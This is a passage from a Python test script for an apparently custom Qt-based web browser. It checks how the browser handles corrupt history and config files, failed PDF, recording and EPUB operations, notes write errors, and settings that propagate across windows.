        br.flash = _oflash202
    import shutil as _sh202
    _sh202.rmtree(_d202, ignore_errors=True)
# ---- 203: failure paths: history, launch config, zoom, guard tables ----
import page_guard as _pg_x203
_hf_x203 = B.HISTORY_FILE
_had_x203 = _hf_x203.read_bytes() if _hf_x203.exists() else None
_before_x203 = set(_hf_x203.parent.glob(_hf_x203.name + ".corrupt-*"))
try:
    _hf_x203.write_bytes(b'{"url": "x", "t": ')
    _rows_x203 = br._read_history()
    _aside_x203 = set(_hf_x203.parent.glob(_hf_x203.name + ".corrupt-*")) - _before_x203
    check("203 F5 an unparsable history is set aside, not left to be overwritten",
          _rows_x203 == [] and not _hf_x203.exists() and len(_aside_x203) == 1,
          (_rows_x203, _aside_x203))
    for _p_x203 in _aside_x203:
        _p_x203.unlink()
    _hf_x203.write_text(json.dumps([
        {"url": "http://a.test/", "t": "yesterday", "title": None},
        {"url": "http://b.test/", "t": 5, "title": 7},
        "junk"]))
    _rows_x203 = br._read_history()
    check("203 F12 a history row with a bad time or title is normalised",
          len(_rows_x203) == 2
          and all(isinstance(r["t"], (int, float)) for r in _rows_x203)
          and all(isinstance(r["title"], str) for r in _rows_x203),
          _rows_x203)
finally:
    if _had_x203 is None:
        _hf_x203.unlink(missing_ok=True)
    else:
        _hf_x203.write_bytes(_had_x203)
    for _p_x203 in set(_hf_x203.parent.glob(_hf_x203.name + ".corrupt-*")) - _before_x203:
        _p_x203.unlink()

_ok_x203 = True
try:
    _hosts_x203 = [B._blocked_hosts({"blockHosts": _v}) for _v in (5, True, "a.test", {"a": 1})]
    _cfg_x203 = B._sane_proxy_config({
        "proxyProfiles": [{"name": ["x"]}, {"name": "p"}],
        "proxyAuto": {"rules": [{"pattern": 5}, {"pattern": "a.test", "profile": ["p"]},
                                {"pattern": "b.test", "profile": "p"}]}})
    _plan_x203 = B._proxy_routing(_cfg_x203)
except Exception as _e_x203:
    _ok_x203 = False
    _hosts_x203 = _cfg_x203 = _e_x203
check("203 F13 wrong-typed block list and proxy tables do not raise at launch",
      _ok_x203 and _cfg_x203["proxyProfiles"] == [{"name": "p"}]
      and len(_cfg_x203["proxyAuto"]["rules"]) == 1, (_hosts_x203, _cfg_x203))

_zs_x203 = br.config.get("zoomSites", None)
try:
    _res_x203 = []
    for _v_x203 in (["a"], "text", {"a.test": "1.5x"}):
        br.config["zoomSites"] = _v_x203
        _res_x203.append(br.site_zoom("a.test"))
    check("203 T6 site_zoom survives a zoomSites of the wrong type",
          _res_x203 == [None, None, None], _res_x203)
except Exception as _e_x203:
    check("203 T6 site_zoom survives a zoomSites of the wrong type", False, repr(_e_x203))
finally:
    if _zs_x203 is None:
        br.config.pop("zoomSites", None)
    else:
        br.config["zoomSites"] = _zs_x203

try:
    _r_x203 = _pg_x203.rules({"fakePlaces": ["a"], "micSites": "x", "callAudio": [1],
                              "leaveTrapSites": 5, "popupSites": True})
    check("203 T17 guard rules ignore per-site tables of the wrong type",
          _r_x203["places"] == {} and _r_x203["mics"] == {} and _r_x203["calls"] == {}
          and _r_x203["keep"] == [] and _r_x203["allow"] == [], _r_x203)
except Exception as _e_x203:
    check("203 T17 guard rules ignore per-site tables of the wrong type", False, repr(_e_x203))

# fold: a history time that is a number but out of range is nonsense too
_rows206 = None
_hf206 = B.HISTORY_FILE
_was206 = _hf206.read_bytes() if _hf206.exists() else None
try:
    _hf206.write_text('[{"url": "https://a206.test/", "t": 1e30},'
                      ' {"url": "https://b206.test/", "t": -5},'
                      ' {"url": "https://c206.test/", "t": Infinity}]')
    _rows206 = br._read_history()
finally:
    if _was206 is None:
        try:
            _hf206.unlink()
        except OSError:
            pass
    else:
        _hf206.write_bytes(_was206)
check("206 history times out of range read back as 0",
      _rows206 is not None and [r.get("t") for r in _rows206] == [0, 0, 0],
      str(_rows206))
# fold: proxyAuto.default of the wrong type is dropped
_pc206 = B._sane_proxy_config({"activeProxy": "auto",
                               "proxyAuto": {"default": ["x"]}})
check("206 a proxyAuto default that is not a name is dropped",
      "default" not in _pc206.get("proxyAuto", {}), str(_pc206))
# ===== twenty-second pass, group 204: failures of captures, books, translation =====
import os as _os204
import zipfile as _zf204

_flashes204 = []
_real_flash204 = br.flash
br.flash = lambda *a, **k: _flashes204.append(str(a[0]) if a else "")
_dir204 = _Path(_tempfile.mkdtemp(prefix="t204-"))


def _ui204(key):
    return br._ui_str(key)


try:
    # F6: a failed encode keeps the recording as a GIF
    _real_tools204 = br.record_tools
    _real_ftv204 = B.capture.frames_to_video
    br.record_tools = lambda: {"recorder": "", "ffmpeg": "/bin/true"}
    B.capture.frames_to_video = lambda *a, **k: ""
    _v204 = br.new_tab(url=srv.url("/twhome"), switch=True)
    H.wait_for(lambda: "/twhome" in _v204.url().toString(), 8000)
    H.spin(300)
    try:
        br.start_recording(view=_v204, fps=5)
        H.spin(700)
        _out204 = br.stop_recording(save=True, fmt="webm")
    finally:
        br.__dict__.pop("record_tools", None)
        B.capture.frames_to_video = _real_ftv204
    check("F6 a failed ffmpeg encode still saves the frames as a GIF",
          _out204.endswith(".gif") and _Path(_out204).is_file()
          and _ui204("recGifFallback") in _flashes204,
          str((_out204, _flashes204[-2:])))
    br.close_tab(br.tabs.indexOf(_v204), ask=False)

    # F7 / F10: a PDF that could not be written is not reported as saved
    _ro204 = _dir204 / "ro"
    _ro204.mkdir()
    _real_dd204 = br.download_dir
    _v204 = br.new_tab(url=srv.url("/twhome"), switch=True)
    H.wait_for(lambda: "/twhome" in _v204.url().toString(), 8000)
    H.spin(300)
    del _flashes204[:]
    _ro204.chmod(0o500)
    try:
        br.download_dir = lambda create=True: _ro204
        br.pdf_quick(view=_v204)
        H.wait_for(lambda: bool(_flashes204), 8000)
    finally:
        br.__dict__.pop("download_dir", None)
        _ro204.chmod(0o700)
    check("F7 pdf_quick says it failed when the folder cannot be written",
          _ui204("pdfFailed") in _flashes204
          and _ui204("shotPdfQuick") not in " ".join(_flashes204),
          str(_flashes204))

    del _flashes204[:]
    _real_fd204 = B.QFileDialog.getSaveFileName
    _ro204.chmod(0o500)
    try:
        B.QFileDialog.getSaveFileName = staticmethod(
            lambda *a, **k: (str(_ro204 / "sel.pdf"), ""))
        jsq(_v204, "getSelection().selectAllChildren(document.body)")
        br.print_selection(view=_v204)
        H.wait_for(lambda: bool(_flashes204), 8000)
    finally:
        B.QFileDialog.getSaveFileName = _real_fd204
        _ro204.chmod(0o700)
    check("F10 print_selection says it failed when the PDF is not written",
          _ui204("pdfFailed") in _flashes204
          and _ui204("navPrinted") % "sel.pdf" not in _flashes204,
          str(_flashes204))
    br.close_tab(br.tabs.indexOf(_v204), ask=False)

    # F8 / F9: a big book opens, a damaged chapter is skipped
    _big204 = _dir204 / "big.epub"
    with _zf204.ZipFile(str(_big204), "w", _zf204.ZIP_DEFLATED) as _z204:
        for _i204 in range(3):
            _z204.writestr("c%d.xhtml" % _i204,
                           "<html><body><h1>Part %d</h1><p>%s</p></body></html>"
                           % (_i204, "word " * 160000))
    for _priv204 in (False, True):
        del _flashes204[:]
        _v204 = br.new_tab(url=None, switch=True, private=_priv204)
        _n204 = br.open_epub(str(_big204), view=_v204)
        H.wait_for(lambda: (jsq(_v204, "document.querySelectorAll('section').length")
                            or 0) >= 1, 8000)
        _secs204 = jsq(_v204, "document.querySelectorAll('section').length")
        check("F8 a book over 2 MB is cut to what fits and says so (%s tab)"
              % ("private" if _priv204 else "normal"),
              _n204 == 3 and _secs204 and 1 <= _secs204 < 3
              and _ui204("epubCut") in _flashes204
              and getattr(br, "_epub_tmp", None) is None,
              str((_n204, _secs204, _flashes204[-1:])))
        br.close_tab(br.tabs.indexOf(_v204), ask=False)

    _bad204 = _dir204 / "bad.epub"
    with _zf204.ZipFile(str(_bad204), "w", _zf204.ZIP_STORED) as _z204:
        _z204.writestr("a.xhtml", "<html><body><h1>A</h1><p>one</p></body></html>")
        _z204.writestr("b.xhtml", "<html><body><h1>B</h1><p>two</p></body></html>")
    _raw204 = bytearray(_bad204.read_bytes())
    _loc204 = _raw204.find(b"PK\x03\x04")
    _cen204 = _raw204.find(b"PK\x01\x02")
    _raw204[_loc204 + 8:_loc204 + 10] = (99).to_bytes(2, "little")
    _raw204[_cen204 + 10:_cen204 + 12] = (99).to_bytes(2, "little")
    _bad204.write_bytes(bytes(_raw204))
    _v204 = br.new_tab(url=None, switch=True)
    try:
        _got204 = br.open_epub(str(_bad204), view=_v204)
        _err204 = ""
    except Exception as _e204:
        _got204, _err204 = None, repr(_e204)
    check("F9 a chapter packed in an unreadable way is skipped, the rest opens",
          _got204 == 1, str((_got204, _err204)))
    br.close_tab(br.tabs.indexOf(_v204), ask=False)

    # F11: a translator that answers nothing stops the run
    _v204 = br.new_tab(url=srv.url("/twhome"), switch=False)
    H.wait_for(lambda: "/twhome" in _v204.url().toString(), 8000)
    _calls204 = []
    _real_rt204 = br.run_translator
    br.run_translator = lambda text, then=None, **k: (
        _calls204.append(text), then and then("")) and True
    del _flashes204[:]
    _job204 = {"rows": [(0, "first block"), (1, "second block")],
               "view": _v204, "lang": "de", "key": "__trNodes204"}
    _v204._translate_job = _job204
    try:
        br._translate_step(_job204)
        H.spin(300)
    finally:
        br.__dict__.pop("run_translator", None)
    check("F11 an empty translator answer stops the job and says so",
          _calls204 == ["first block"] and _ui204("trFailed") in _flashes204
          and _v204._translate_job is None
          and _ui204("trDone") not in _flashes204,
          str((_calls204, _flashes204)))
    br.close_tab(br.tabs.indexOf(_v204), ask=False)

    # T11: a capture that could not be written is not counted or noted
    _img204 = B.QImage(40, 30, B.QImage.Format.Format_RGB32)
    _img204.fill(B.QColor("#336699"))
    _one204 = _dir204 / "one.png"
    _img204.save(str(_one204), "PNG")
    _sheet204 = br._contact_sheet([str(_one204)],
                                  _dir204 / "missing-dir" / "sheet.png")
    check("T11 a contact sheet that was not written returns no path",
          _sheet204 == "", repr(_sheet204))
    _okish204 = br._contact_sheet([str(_one204)], _dir204 / "sheet.png")
    check("T11 ...and one that was written returns its path",
          _okish204 == str(_dir204 / "sheet.png")
          and _Path(_okish204).is_file(), repr(_okish204))

    _v204 = br.new_tab(url=srv.url("/twhome"), switch=True)
    H.wait_for(lambda: "/twhome" in _v204.url().toString(), 8000)
    H.spin(300)
    _lro204 = _dir204 / "lapse-ro"
    _lro204.mkdir()
    _lro204.chmod(0o500)
    _was204 = [getattr(br, n, None) for n in
               ("_lapse_view", "_lapse_dir", "_lapse_last")]
    del _flashes204[:]
    try:
        br._lapse_view = _v204
        br._lapse_dir = _lro204
        br._lapse_last = None
        _t1204 = br._lapse_tick()
        _t2204 = br._lapse_tick()
    finally:
        _lro204.chmod(0o700)
        br._lapse_view, br._lapse_dir, br._lapse_last = _was204
        br.__dict__.pop("_lapse_failing", None)
    check("T11 a timelapse frame that could not be saved is not 'last' and is said once",
          _t1204 is False and _t2204 is False
          and _flashes204.count(_ui204("shotFailed")) == 1
          and not any(_lro204.iterdir()),
          str((_t1204, _t2204, _flashes204)))
    br.close_tab(br.tabs.indexOf(_v204), ask=False)
finally:
    br.flash = _real_flash204
    br.__dict__.pop("flash", None)
    for _n204 in ("record_tools", "download_dir", "run_translator"):
        br.__dict__.pop(_n204, None)
    import shutil as _sh204
    for _p204 in _dir204.rglob("*"):
        try:
            if _p204.is_dir():
                _p204.chmod(0o700)
        except OSError:
            pass
    _sh204.rmtree(str(_dir204), ignore_errors=True)
# ---- 205: failure paths in the notes drawer, the editor and workspaces ----
import notes as _N205
import os as _os205
import inspect as _insp205

_d205 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_dr205 = _N205.Desk(_d205)

# F15: a to-do that could not be written is reported, not swallowed
_dr205.add_todo("first205")
_real205 = _N205._write_atomic
try:
    def _boom205(path, text):
        raise OSError("disk full")
    _N205._write_atomic = _boom205
    _r_add205 = _dr205.add_todo("second205")
    _r_tog205 = _dr205.toggle_todo(0)
    _r_del205 = _dr205.delete_todo(0)
    _r_mov205 = _dr205.move_todo(0, 1)
    _r_clr205 = _dr205.clear_done_todos()
finally:
    _N205._write_atomic = _real205
check("205 F15 a failed to-do write answers False, not the old list",
      _r_add205 is False and _r_tog205 is False and _r_del205 is False
      and _r_clr205 is False and _r_mov205 in (False, _dr205.todos()),
      str((_r_add205, _r_tog205, _r_del205, _r_mov205, _r_clr205)))
check("205 F15 and the file is as it was",
      [t["text"] for t in _dr205.todos()] == ["first205"])
_list205 = _dr205.add_todo("third205")
check("205 F15 a write that works still answers the list",
      isinstance(_list205, list) and len(_list205) == 2)
_notes205 = (_Path(B.__file__).parent / "notes.html").read_text()
check("205 F15 the page keeps the typed words and says so on a failed write",
      "res === false) { failMsg = true; render(); return; }" in _notes205
      and "failLine(body)" in _notes205)
check("205 F15 the tab is not closed when the to-do was not written",
      "if rows is False:" in _insp205.getsource(B.Browser.tab_to_todo))

# T18/F16: a snippets file that does not parse is moved aside, not replaced
_sp205 = _dr205.snippet_path()
_sp205.write_text('{"ip": "1.2.3.4",}')
_t205 = _dr205.set_snippet("new205", "text")
_aside205 = [p.name for p in _d205.iterdir()
             if p.name.startswith("snippets.json.corrupt-")]
check("205 T18 a snippets file with a typo is moved aside before the add",
      isinstance(_t205, dict) and "new205" in _t205 and len(_aside205) == 1
      and '"ip"' in (_d205 / _aside205[0]).read_text(), str(_aside205))
_sp205.write_text('["a list"]')
_t205 = _dr205.set_snippet("two205", "x")
check("205 T18 a snippets file of the wrong type is moved aside too",
      isinstance(_t205, dict) and "two205" in _t205
      and len([p for p in _d205.iterdir()
               if p.name.startswith("snippets.json.corrupt-")]) == 2)
try:
    _N205._write_atomic = _boom205
    _r_snip205 = _dr205.set_snippet("three205", "x")
finally:
    _N205._write_atomic = _real205
check("205 T18 a failed snippet write answers False",
      _r_snip205 is False)

# T19/T20: a Latin-1 file keeps its original bytes in a .bak
_l1205 = _d205 / "latin205.md"
_l1205.write_bytes("---\ntitle: Küche\n---\nKüche".encode("latin-1"))
_dr205.save_note("latin205", body="changed")
_bak205 = _d205 / "latin205.md.bak"
check("205 T19 the original bytes of a non-UTF-8 note are kept as .bak",
      _bak205.exists()
      and _bak205.read_bytes() == "---\ntitle: Küche\n---\nKüche"
      .encode("latin-1"))
# broken again (a different Latin-1 text): the first .bak is kept
_l1205.write_bytes("---\ntitle: Straße\n---\nStraße".encode("latin-1"))
_dr205.save_note("latin205", body="changed again")
check("205 T19 the .bak is not overwritten by a later save",
      _bak205.read_bytes().endswith("Küche".encode("latin-1")))
_tl205 = _d205 / "todo.md"
_tl205.write_bytes("- [ ] Küche\n".encode("latin-1"))
_dr205.toggle_todo(0)
check("205 T20 the to-do file gets a .bak before its first rewrite",
      (_d205 / "todo.md.bak").exists())

# T5: the editor's result is read leniently and its file removed on every path
_ed205 = _insp205.getsource(B.Browser.edit_in_editor)
check("205 T5 the editor file is read with errors=replace and removed first",
      'errors="replace"' in _ed205 and "text = None" in _ed205
      and _ed205.index("path.unlink()") < _ed205.index("if text is None:"))

# T12: switching away with nothing open does not blank the saved set
_ws205 = dict(br.workspaces())
_now205 = br.workspace_now()
_saved205 = []
_orig_save205 = br.save_workspace
try:
    br.config["workspaces"] = {
        "A205": [{"u": "http://a205.test/", "t": "A"}],
        "B205": [{"u": "http://b205.test/", "t": "B"}]}
    br.config["workspaceNow"] = "A205"
    br._real_tabs = lambda: []
    br.new_tab = lambda **k: br.tabs.currentWidget()
    br.save_workspace = lambda name: _saved205.append(name)
    br.open_workspace("B205")
    check("205 T12 nothing open: the set he leaves is not saved as empty",
          _saved205 == [] and br.workspaces()["A205"][0]["u"]
          == "http://a205.test/", str(_saved205))
finally:
    for _n205 in ("_real_tabs", "new_tab", "save_workspace"):
        br.__dict__.pop(_n205, None)
    br.config["workspaces"] = _ws205
    br.config["workspaceNow"] = _now205

import shutil as _sh205
_sh205.rmtree(str(_d205), ignore_errors=True)

# fold: browser --todo says when the list could not be written
_desk206 = br.desk()
if _desk206 is not None:
    _desk206.add_todo = lambda *a, **k: False
    try:
        _cli206 = br.take_cli_todo("mow the lawn 206")
    finally:
        _desk206.__dict__.pop("add_todo", None)
    check("206 browser --todo answers not-saved when the write fails",
          _cli206 == "not-saved", _cli206)
# ---- twenty-third pass: settings reach every window (208) ----
_w2_x208 = br.new_window()
_old_x208 = {k: br.config.get(k) for k in
             ("tabStrip", "tabCount", "hideStripSingle", "barLock",
              "zoom", "zoomSites")}
try:
    H.spin(300)
    br.bridge.setSetting("tabStrip", json.dumps("bottom"))
    check("208 tabStrip moves the other window's strip too",
          _w2_x208.tabs.tabPosition() == B.QTabWidget.TabPosition.South)
    br.bridge.setSetting("tabStrip", json.dumps("top"))
    check("208 tabStrip back to top in the other window",
          _w2_x208.tabs.tabPosition() == B.QTabWidget.TabPosition.North)
    br.bridge.setSetting("tabCount", json.dumps(True))
    check("208 tabCount label shown in the other window",
          not _w2_x208._tabcount.isHidden())
    br.bridge.setSetting("tabCount", json.dumps(False))
    check("208 tabCount label hidden in the other window",
          _w2_x208._tabcount.isHidden())
    # the other window's tab is zoomed by hand first, so a slider that
    # did not reach it would leave it at 2.0
    _v_x208 = _w2_x208.current()
    if _v_x208 is not None and hasattr(_v_x208, "setZoomFactor"):
        _v_x208._zoom = 2.0
        _v_x208.setZoomFactor(2.0)
    br.bridge.setSetting("zoom", json.dumps(1.5))
    check("208 zoom re-bases the other window's tab",
          _v_x208 is not None and hasattr(_v_x208, "setZoomFactor")
          and getattr(_v_x208, "_zoom", None) is None
          and abs(_v_x208.zoomFactor() - 2.0) > 1e-3,
          str(_v_x208.zoomFactor() if _v_x208 is not None else None))
    _src_x208 = __import__("inspect").getsource(B.Bridge.setSetting)
    check("208 barKeyBtn is applied with the other bar buttons",
          '"barKeyBtn"' in _src_x208 and '"barDecode"' in _src_x208)
finally:
    for _k_x208, _o_x208 in _old_x208.items():
        br.bridge.setSetting(_k_x208, json.dumps(_o_x208))
    _w2_x208._closing_anyway = True
    _w2_x208.close()
# ---- twenty-third pass: settings reach every window (209) ----
import inspect as _insp_x209
_w2_x209 = br.new_window()
_keys_x209 = ("gamepadOn", "cpuWatch", "leakWatch", "pressureWatch",
              "memoryBudget", "videoCap", "tabSnapshots", "pauseForCalls")
_old_x209 = {k: br.config.get(k) for k in _keys_x209}
_calls_x209 = []
try:
    H.spin(300)
    # the (window, view) list covers the second window and a split half
    check("209 _windows_views reaches the other window's tabs",
          any(w is _w2_x209 for w, _v in br._windows_views()))
    _fake_x209 = object()
    _w2_x209._split_view = _fake_x209
    try:
        check("209 _windows_views includes a split half",
              any(v is _fake_x209 for _w, v in br._windows_views()))
    finally:
        _w2_x209._split_view = None
    # ad css repaint asks every window
    _w2_x209.apply_ad_css = lambda view=None: _calls_x209.append("ad")
    try:
        br.refresh_ad_css()
        check("209 refresh_ad_css repaints the other window's tabs",
              "ad" in _calls_x209)
    finally:
        _w2_x209.__dict__.pop("apply_ad_css", None)
    _src_x209 = _insp_x209.getsource(B.Browser.refresh_a11y)
    check("209 refresh_a11y runs in every window's tabs",
          "_windows_views" in _src_x209 and "self.tabs.count()"
          not in _src_x209)
    check("209 apply_audio_shape covers every window",
          "_windows_views" in _insp_x209.getsource(
              B.Browser.apply_audio_shape))
    # gamepad
    _calls_x209.clear()
    _w2_x209.gamepad = lambda on=None, view=None, then=None: \
        _calls_x209.append(("pad", on))
    try:
        br.bridge.setSetting("gamepadOn", json.dumps(False))
        check("209 gamepad switch reaches the other window",
              ("pad", False) in _calls_x209)
    finally:
        _w2_x209.__dict__.pop("gamepad", None)
    # watchers
    br.bridge.setSetting("cpuWatch", json.dumps(True))
    check("209 cpuWatch starts in the other window",
          getattr(_w2_x209, "_cpu_timer", None) is not None)
    br.bridge.setSetting("cpuWatch", json.dumps(False))
    check("209 cpuWatch stops in the other window",
          getattr(_w2_x209, "_cpu_timer", None) is None)
    br.bridge.setSetting("leakWatch", json.dumps(True))
    check("209 leakWatch starts in the other window",
          getattr(_w2_x209, "_leak_timer", None) is not None)
    br.bridge.setSetting("leakWatch", json.dumps(False))
    check("209 leakWatch stops in the other window",
          getattr(_w2_x209, "_leak_timer", None) is None)
    # budget outlives the pressure switch
    br.bridge.setSetting("pressureWatch", json.dumps(False))
    br.bridge.setSetting("memoryBudget", json.dumps(4096))
    br.bridge.setSetting("pressureWatch", json.dumps(False))
    check("209 the budget keeps the timer when pressure goes off",
          getattr(br, "_psi_timer", None) is not None
          and getattr(_w2_x209, "_psi_timer", None) is not None)
    br.bridge.setSetting("memoryBudget", json.dumps(0))
    check("209 no budget and no pressure: the timer stops",
          getattr(br, "_psi_timer", None) is None
          and getattr(_w2_x209, "_psi_timer", None) is None)
    # video cap
    _calls_x209.clear()
    _w2_x209.cap_video = lambda height=None, view=None, then=None: \
        _calls_x209.append(("cap", height))
    try:
        br.bridge.setSetting("videoCap", json.dumps(777))
        check("209 an unknown videoCap is stored as 0",
              br.config.get("videoCap") == 0)
        check("209 videoCap reaches the other window, 0 included",
              ("cap", 0) in _calls_x209)
    finally:
        _w2_x209.__dict__.pop("cap_video", None)
    # tab snapshots: only the first window's timer runs
    br.bridge.setSetting("tabSnapshots", json.dumps(False))
    check("209 tabSnapshots off stops the timer",
          not br._snap_timer.isActive()
          and not _w2_x209._snap_timer.isActive())
    br.bridge.setSetting("tabSnapshots", json.dumps(True))
    check("209 tabSnapshots on runs the first window's timer only",
          br._snap_timer.isActive() and not _w2_x209._snap_timer.isActive())
    # pause for calls across windows
    class _Page_x209:
        def recentlyAudible(self):
            return True

    class _View_x209:
        def page(self):
            return _Page_x209()
    _song_x209 = _View_x209()
    _saved_x209 = (_w2_x209._real_tabs, br._media_live)
    _w2_x209._real_tabs = lambda *a, **k: [(0, _song_x209)]
    # the stand-in is not a widget: the tab strip is told it is there
    _w2_x209.tabs.indexOf = lambda v: 0 if v is _song_x209 else -1
    _w2_x209.media_tool = lambda name, view=None, **k: \
        _calls_x209.append((name, view))
    br.config["pauseForCalls"] = True
    br._media_live = [{"view": object(), "kind": "microphone",
                       "title": "t"}]
    _calls_x209.clear()
    try:
        br.pause_for_call()
        check("209 a call pauses the other window's music",
              ("pauseall", _song_x209) in _calls_x209)
        br.resume_after_call()
        check("209 the end of the call resumes it there too",
              ("resumeall", _song_x209) in _calls_x209)
    finally:
        _w2_x209.__dict__.pop("_real_tabs", None)
        _w2_x209.tabs.__dict__.pop("indexOf", None)
        _w2_x209.__dict__.pop("media_tool", None)
        br._media_live = _saved_x209[1]
        br._paused_for_call = []
        _w2_x209._paused_for_call = []
    # search engine reaches open start pages
    check("209 searchEngine refreshes open start pages",
          '"searchEngine"' in _insp_x209.getsource(B.Bridge.setSetting))
    check("209 the start page re-reads settings when told",
          "loadExtras(); refreshSettings();" in
          (_Path(B.__file__).parent / "start.html").read_text())
finally:
    for _k_x209, _o_x209 in _old_x209.items():
        br.bridge.setSetting(_k_x209, json.dumps(_o_x209))
    _w2_x209._closing_anyway = True
    _w2_x209.close()
# ---- twenty-third pass: settings reach the open pages and every window (210) ----
import inspect as _insp_x210
_w2_x210 = br.new_window()
_keys_x210 = ("ownRequestLog", "autoRetry", "keyGuard", "layoutKeys",
              "recordClicks", "cleanPaste", "twitchAds", "twitchPoints",
              "showPwButtons")
_old_x210 = {k: br.config.get(k) for k in _keys_x210}
_calls_x210 = []
try:
    H.spin(300)
    # ownRequestLog: the other window's manager follows, and off clears
    br.bridge.setSetting("ownRequestLog", json.dumps(True))
    check("210 ownRequestLog on reaches the other window",
          _w2_x210._nam.watching is True)
    _w2_x210._nam.log.append({"how": "x", "url": "http://x/", "host": "x"})
    br.bridge.setSetting("ownRequestLog", json.dumps(False))
    check("210 ownRequestLog off stops the other window and clears its log",
          _w2_x210._nam.watching is False and not _w2_x210._nam.log)
    # keyGuard / layoutKeys rebuild the shortcuts of every window
    _w2_x210.rebind_shortcuts = lambda: _calls_x210.append("rebind")
    try:
        br.bridge.setSetting("keyGuard", json.dumps(["F1"]))
        check("210 keyGuard rebinds the other window's shortcuts",
              "rebind" in _calls_x210)
        _calls_x210.clear()
        br.bridge.setSetting("layoutKeys", json.dumps(
            not br.config.get("layoutKeys", True)))
        check("210 layoutKeys rebinds the other window's shortcuts",
              "rebind" in _calls_x210)
    finally:
        _w2_x210.__dict__.pop("rebind_shortcuts", None)
    # recordClicks and cleanPaste are pushed to open pages
    _orig_perf_x210, _orig_nav_x210 = br.refresh_perf, br.refresh_nav
    br.refresh_perf = lambda live=True: _calls_x210.append("perf")
    br.refresh_nav = lambda live=True: _calls_x210.append("nav")
    try:
        _calls_x210.clear()
        br.bridge.setSetting("recordClicks", json.dumps(True))
        br.bridge.setSetting("cleanPaste", json.dumps(True))
        check("210 recordClicks refreshes the page script",
              "perf" in _calls_x210)
        check("210 cleanPaste refreshes the nav script",
              "nav" in _calls_x210)
    finally:
        br.__dict__.pop("refresh_perf", None)
        br.__dict__.pop("refresh_nav", None)
    # twitch tools and the eyes run in open tabs of other windows
    _v_x210 = _w2_x210.tabs.widget(0)
    _got_x210 = []
    _w2_x210.play_tool = lambda name, view=None, then=None, arg=None: \
        _got_x210.append((name, arg))
    _w2_x210.form_tool = lambda name, view=None, then=None, arg=None: \
        _got_x210.append((name, arg))
    _w2_x210._host_of = lambda url: "www.twitch.tv"
    try:
        br.bridge.setSetting("twitchAds", json.dumps(False))
        br.bridge.setSetting("twitchPoints", json.dumps(False))
        br.bridge.setSetting("showPwButtons", json.dumps(False))
        check("210 twitchAds off reaches the other window",
              ("twitchads", False) in _got_x210)
        check("210 twitchPoints off reaches the other window",
              ("twitchpoints", False) in _got_x210)
        check("210 showPwButtons off reaches the other window",
              ("eye", False) in _got_x210)
    finally:
        for _n_x210 in ("play_tool", "form_tool", "_host_of"):
            _w2_x210.__dict__.pop(_n_x210, None)
    check("210 twitchpoints tool has an off path",
          'on === false' in B.PLAY_TOOLS["twitchpoints"])
    # autoRetry off empties the waiting rows
    br.config["autoRetry"] = False
    br.__dict__.setdefault("_retry_rows", {})["x210"] = ["http://x/", 0]
    br._retry_tick()
    check("210 autoRetry off clears the waiting retries",
          not br._retry_rows)
finally:
    for _k_x210, _v_old_x210 in _old_x210.items():
        if _v_old_x210 is None:
            br.config.pop(_k_x210, None)
        else:
            br.config[_k_x210] = _v_old_x210
    br.save_config(quiet=True)
    br.rebind_shortcuts()
    br._retry_rows.clear()
    _w2_x210._closing_anyway = True
    _w2_x210.close()
# ---- twenty-third pass: page switches reach open tabs, on and off (211) ----
import inspect as _insp_x211
_w2_x211 = br.new_window()
_keys_x211 = ("pauseHidden", "holdFast", "hideCursor", "spoilerShield",
              "readNoLineNumbers", "readSelBar", "readDrafts", "capOn")
_old_x211 = {k: br.config.get(k) for k in _keys_x211}
_v2_x211 = None
try:
    H.spin(300)
    _v2_x211 = _w2_x211.new_tab()
    _v2_x211 = _w2_x211.current() if not hasattr(_v2_x211, "page") else _v2_x211
    H.load(_v2_x211, srv.url("/twhome"))
    H.wait_for(lambda: "/twhome" in _v2_x211.url().toString(), 8000)
    H.spin(300)

    def _flag_x211(code, world):
        return jsq(_v2_x211, code, world)

    # the other window's already-open page follows the switch, on...
    for _k, _flag, _world in (
            ("pauseHidden", "window.__pauseHidden", B.MAIN_WORLD_ID),
            ("holdFast", "window.__holdFast", B.MAIN_WORLD_ID),
            ("hideCursor", "window.__hideCursor", B.MAIN_WORLD_ID),
            ("readNoLineNumbers", "window.__noLineNums", B.MAIN_WORLD_ID),
            ("readDrafts", "window.__draftWatch", B.MAIN_WORLD_ID),
            ("readSelBar", "window.__selBar", B.APP_WORLD_ID)):
        br.bridge.setSetting(_k, json.dumps(True))
        _on = H.wait_for(
            lambda: _flag_x211("!!" + _flag, _world) is True, 4000)
        br.bridge.setSetting(_k, json.dumps(False))
        _off = H.wait_for(
            lambda: _flag_x211("!" + _flag, _world) is True, 4000)
        check("211 %s on and off reach a tab in another window" % _k,
              _on and _off, "on=%r off=%r" % (_on, _off))
    # ...and the spoiler style comes and goes
    br.bridge.setSetting("spoilerShield", json.dumps(True))
    _on = H.wait_for(lambda: _flag_x211(
        "!!document.getElementById('media-spoiler')",
        B.MAIN_WORLD_ID) is True, 4000)
    br.bridge.setSetting("spoilerShield", json.dumps(False))
    _off = H.wait_for(lambda: _flag_x211(
        "!document.getElementById('media-spoiler')",
        B.MAIN_WORLD_ID) is True, 4000)
    check("211 spoilerShield on and off reach a tab in another window",
          _on and _off, "on=%r off=%r" % (_on, _off))
    # on again after off must not stack a second listener: the tool
    # answers "on" (woken), never builds again
    br.media_tool2("pausehidden", view=_v2_x211, arg=True)
    _ans = []
    br.media_tool2("pausehidden", view=_v2_x211, arg=False)
    br.media_tool2("pausehidden", view=_v2_x211, arg=True,
                   then=lambda r: _ans.append(r))
    H.wait_for(lambda: _ans, 3000)
    check("211 a switch put off and on again answers on",
          _ans == ["on"], repr(_ans))
    br.media_tool2("pausehidden", view=_v2_x211, arg=False)
    # captions: the automatic call only turns on, never flips and is quiet
    _src_x211 = _insp_x211.getsource(br.toggle_captions)
    _mx_x211 = _insp_x211.getsource(br.media_extras)
    check("211 captions on page load forces on and stays quiet",
          "quiet=True, force=True" in _mx_x211 and "quiet" in _src_x211
          and "want.on" in B.MEDIA_TOOLS2["captions"])
    _flashes_x211 = []
    _orig_flash_x211 = br.flash
    br.flash = lambda *a, **k: _flashes_x211.append(a)
    try:
        br.toggle_captions("", view=_v2_x211, quiet=True, force=True)
        H.spin(600)
    finally:
        br.__dict__.pop("flash", None)
    check("211 a quiet captions call on a page without a video says nothing",
          not _flashes_x211, repr(_flashes_x211))
finally:
    for _k, _v in _old_x211.items():
        br.bridge.setSetting(_k, json.dumps(_v if _v is not None else False))
    _w2_x211._closing_anyway = True
    _w2_x211.close()
